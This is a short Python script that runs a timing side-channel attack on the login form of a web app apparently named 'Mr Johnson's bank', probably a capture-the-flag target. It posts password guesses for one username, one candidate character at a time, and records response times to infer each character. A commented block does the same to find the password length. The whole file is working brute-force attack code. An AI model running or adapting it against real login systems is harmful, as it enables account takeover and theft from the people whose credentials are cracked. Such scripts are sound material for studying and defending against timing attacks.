import requests
from string import printable
from itertools import product
import threading 
from queue import Queue
import time

final = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()_{}?"	



for i in final:
    website = "https://mr-johnsons-bank-1-bvel4oasra-uc.a.run.app/"
    payload = {'username':'williamjohnson', 'Password':f'{i + "d"*5}'}
    response = requests.post(website,params = payload)
    # print(response.text)
    # if response.elapsed.total_seconds()>0.30 or response.elapsed.total_seconds()< 0.20:
    print(i  , response.elapsed.total_seconds())

# for i in range(0,100):
#     website = "https://mr-johnsons-bank-1-bvel4oasra-uc.a.run.app/"
#     payload = {'username':'williamjohnson', 'Password':f'{"d"*i}'}
#     response = requests.post(website,params = payload)
#     # print(response.text)
#     # if response.elapsed.total_seconds()>0.30 or response.elapsed.total_seconds()< 0.20:
#     print(i  , response.elapsed.total_seconds())
